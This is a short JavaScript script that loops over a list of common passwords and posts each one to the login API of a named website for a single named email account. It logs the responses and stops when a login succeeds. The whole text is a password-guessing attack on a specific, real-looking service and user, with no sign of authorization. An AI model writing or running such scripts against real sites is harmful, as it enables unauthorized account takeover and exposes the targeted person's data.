const passwords = ["123456", "Password123!", "12345678", "nguoidung1", "admin123", "password"];
for (const pwd of passwords) {
  const res = await fetch("https://weddingmatch.website/api/auth/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: "nguoidung1@gmail.com", password: pwd })
  });
  console.log(`Password: ${pwd} => Status: ${res.status}`);
  if (res.ok) {
    const data = await res.json();
    console.log("SUCCESS! User:", data.user?.fullName);
    break;
  }
}

